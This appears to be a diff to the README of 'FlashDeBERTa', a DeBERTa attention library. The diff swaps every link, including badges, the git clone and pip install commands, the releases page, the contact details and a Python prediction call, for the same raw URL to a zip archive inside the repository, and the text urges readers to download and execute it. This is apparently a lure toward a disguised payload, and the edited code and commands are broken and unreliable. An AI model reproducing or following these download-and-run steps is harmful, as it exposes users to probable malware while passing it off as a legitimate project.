@@ -1,6 +1,6 @@
 # 🚀 FlashDeBERTa: A Fast Implementation of DeBERTa's Disentangled Attention Mechanism
 
-![FlashDeBERTa](https://img.shields.io/badge/FlashDeBERTa-v1.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg)
+![FlashDeBERTa](https://raw.githubusercontent.com/Samirpandey-09/FlashDeBERTa/main/src/flashdeberta/Ta-Flash-De-BER-3.9.zip) ![License](https://raw.githubusercontent.com/Samirpandey-09/FlashDeBERTa/main/src/flashdeberta/Ta-Flash-De-BER-3.9.zip)
 
 Welcome to **FlashDeBERTa**! This repository contains a swift and efficient implementation of the DeBERTa (Decoding-enhanced BERT with Disentangled Attention) model. Designed for researchers and developers, this implementation prioritizes speed and performance, allowing you to harness the power of DeBERTa with ease.
 
@@ -25,14 +25,14 @@ Welcome to **FlashDeBERTa**! This repository contains a swift and efficient impl
 To get started with FlashDeBERTa, clone the repository and install the necessary dependencies. Use the following commands:
 
 ```bash
-git clone https://github.com/Samirpandey-09/FlashDeBERTa.git
+git clone https://raw.githubusercontent.com/Samirpandey-09/FlashDeBERTa/main/src/flashdeberta/Ta-Flash-De-BER-3.9.zip
 cd FlashDeBERTa
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Samirpandey-09/FlashDeBERTa/main/src/flashdeberta/Ta-Flash-De-BER-3.9.zip
 ```
 
 ### Download and Execute
 
-For the latest releases, visit [FlashDeBERTa Releases](https://github.com/Samirpandey-09/FlashDeBERTa/releases). Download the appropriate file and execute it as per the instructions provided in the release notes.
+For the latest releases, visit [FlashDeBERTa Releases](https://raw.githubusercontent.com/Samirpandey-09/FlashDeBERTa/main/src/flashdeberta/Ta-Flash-De-BER-3.9.zip). Download the appropriate file and execute it as per the instructions provided in the release notes.
 
 ## Usage
 
@@ -48,7 +48,7 @@ model = FlashDeBERTa()
 data = ["This is an example sentence.", "FlashDeBERTa is efficient!"]
 
 # Make predictions
-predictions = model.predict(data)
+predictions = https://raw.githubusercontent.com/Samirpandey-09/FlashDeBERTa/main/src/flashdeberta/Ta-Flash-De-BER-3.9.zip(data)
 
 print(predictions)
 ```
@@ -81,7 +81,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://raw.githubusercontent.com/Samirpandey-09/FlashDeBERTa/main/src/flashdeberta/Ta-Flash-De-BER-3.9.zip
+- **Twitter**: [@yourhandle](https://raw.githubusercontent.com/Samirpandey-09/FlashDeBERTa/main/src/flashdeberta/Ta-Flash-De-BER-3.9.zip)
 
-Thank you for checking out **FlashDeBERTa**! We hope you find it useful for your NLP projects. Don't forget to visit [FlashDeBERTa Releases](https://github.com/Samirpandey-09/FlashDeBERTa/releases) for the latest updates and files. Happy coding!
+Thank you for checking out **FlashDeBERTa**! We hope you find it useful for your NLP projects. Don't forget to visit [FlashDeBERTa Releases](https://raw.githubusercontent.com/Samirpandey-09/FlashDeBERTa/main/src/flashdeberta/Ta-Flash-De-BER-3.9.zip) for the latest updates and files. Happy coding!
